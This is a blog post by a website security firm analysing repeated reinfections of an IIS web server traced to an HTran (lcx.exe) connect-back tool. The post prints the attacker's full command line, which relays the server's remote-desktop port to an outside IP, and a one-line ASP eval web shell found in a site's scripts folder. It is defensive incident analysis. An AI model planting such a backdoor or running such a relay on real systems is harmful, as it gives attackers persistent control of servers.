@@ -1,0 +1,46 @@
+Microsoft IIS Web Server – CMD Process Contributing to Website Reinfections
+
+We often spend a lot of time talking about application level malware, but from time to time we do like to dabble in the ever so interesting web server infections as well. It is one of those things that comes with the job. Today, we’re going to chat about an interesting reinfection case in which the client was running their website on a Microsoft’s Internet Information Services (IIS) web server. Yes, contrary to popular belief many organizations, especially large enterprise organizations, still leverage and operate IIS web servers.
+And for those that thought we only dabble in Linux Apache MySql PHP (LAMP) stacks, well now you know.. 🙂
+As is often the case, when we think of the how and the what attackers are set out to do once they penetrate our web server we stop short of the final step – maintaining control of the environment. This is perhaps the most critical, especially today where ownership of a slave box can fetch a great sum of money in the underground.
+
+Sucuri – Anatomy of Website Attack
+These slave machines can be used to reinfect websites, bypassing existing access controls, and can add web servers to networks of other slave machines (otherwise known as zombie networks or botnets). These can be used for Brute Force and Denial of Service attacks and a number of other nefarious acts. This is why when we talk about infections you will often refer to it as only 10% of the problem. Often, what you see, albeit bad and annoying, is usually not the real problem, it’s but a symptom of a bigger infection.
+Such was this case..
+The Windows Server
+If we take a step back in time, you might recall early 2013 – we refer to that as the period where web servers compromises were taking over. We were writing extensively on the latest Darkleech, Cdork and Ebury incidents. I am not going to lie, as a researcher, this was a very exciting time for me and my team. Finally, attackers were showing a level of sophistication worthy of some in-depth analysis.
+Needless to say, we didn’t spend much time on Windows Servers, IIS web servers, it’s not to say that they too were not being affected, but the impact just wasn’t as great. This should be a surprise though as IIS has been steadily losing market share with website owners over the past few years. That however does not mean it’s no longer utilized, it is. This case is an example of that.
+In this case, we were faced with a challenging server issue where every site on the web server would get reinfected with spam, backdoors and other malware as quickly as it was cleaned. Yes, very very annoying…
+The Hunt Begins
+Our first instinct was that the server was suffering from cross-contamination and compromised FTP credentials. From this point, we knew we needed the client to do a full FTP credential reset to control the reinfections, but when they did, the reinfections just started up again like nothing had been done. What was happening here?
+We restarted our investigation and began to fish for answers.
+We suspected that either a vulnerable upload script or a compromised admin area credential had allowed the cross-contamination to restart and was causing the problem. However, as we dove deeper into the logs, the client messaged us to tell us that he had found and killed the suspicious process fixing the issue. Case closed, right?
+Well, no. It wouldn’t make a very good explanatory blog post if that was it….
+Within hours, the reinfections came back with a vengence. Fortunately for the client, we were still analyzing the logs when it returned. You see when it’s something interesting we have a bad case of OCD where we want to better understand what happened. In general, we love it when we’re surprised by complexities within malware and are interested in learning as much as we can about the offending code. Contrary to popular belief, we’re not perfect.
+In the analysis we decided to take a peak at the offending processor. We had to better understand what it was doing.
+Sucuri – Windows IIS Malicious Processor – LCX EXE
+As you can see with the Process Explorer screenshot above, an IIS process (w3wp.exe) started a Command shell (cmd.exe), which was used to start the lcx.exe process. Based on the command line option, it seemed like this process was connecting back to the 199.180.101.206 server. A quick search of the IP turned up numerous complaints across the interwebs about it’s use in bot networks and as the originating node of DDoS attacks.
+Naturally this was a red flag and worthy of further sleuthing. As we continued to look into the process, more and more of the picture began to unfold before us and we started to see where we needed to look for more information (note: all identifying client data has been removed):
+Sucuri – Windows IIS Malicious Processor – CMD EXE
+To start, the command line and current directory were key to finding the backdoor used to start and maintain access to the server as well as where the files were located so we could remove them. If you’re curious, the full command line was:
+
+"C:RECYCLERcmd.exe" /c "cd /d "D:InetpubUsersinfectedwebsitewwwrootscripts"&C:RECYCLER\lcx.exe -slave 199.180.101.206 1113 127.0.0.1 3389&echo [S]&cd&echo [E]"
+
+After reviewing all of the files inside the script directory, we found this piece of code spread out inside of an asp file:
+
+<% Dim ConKey:ConKey="700" Dim InValue:InValue=Request(ConKey) eval(InValue) %>
+
+That’s simple enough, right? The injected file wouldn’t be any better. After checking the access logs, it became clear that it received several valid POST requests throughout the day, making it harder to identify any single suspicious entry.
+Let’s go back to the lcx.exe process for a second. The client had an AntiVirus running and we downloaded a couple extra stand-alone scanners to check for suspicious files to make sure that they were all coming up clean. We also leveraged VirusTotal and this is what they confirmed.
+Sucuri – Winwos IIS Malicious Processor – VirusTotal Confirmation
+For you astute reader, you probably caught my mention earlier of the processor being stopped, yet the server being reinfected. If you did, then you’re likely asking yourself, “Hold up Fio, if they stopped it, yet they were still reinfected, how was it the processor leading to the reinfection?”
+I’m so glad you asked..
+You see, once you identify the infection you have to take it to the next step and understand the order of events. In this scenario, the key was to first kill the process, then remove the backdoors. Doing it in reverse would lead you into an endless circle. Stopping the processor, but leaving the backdoors would allow the attacker to regain entry and reinfect the server. Leaving the processor and removing the backdoor would just reinfect the server with more backdoors.
+Once it was cleared in the right order, like magic, the reinfections stopped. Thank goodness I would say!
+Understanding the Attack
+After checking these files against our database, we can see that the file is the HUC Packet Transmit Tool V1.00, which is a Chinese connect-back backdoor also known as HTran. It was listed as an Advanced Persistent Threat (APT), but since it was easy to get rid of once detected I don’t necessarily believe in its persistence. 🙂
+The malware was configured on slave mode (it can be set to listen, transmit packages or connect-back) and it allowed the attacker to have full access to the infected server.
+Sucuri – Windows IIS Malicious Processor – CMD EXE Options
+There are two main takeaways here.
+First, it’s important to remember that attackers make more money when they have more websites and web servers infected so they will always be trying to find ways into your site.
+Second, it’s always easier to attack the attackers when we work together so, if you’re facing a malware or reinfection issue and you can’t figure out how to clean your site or web server, contact us.
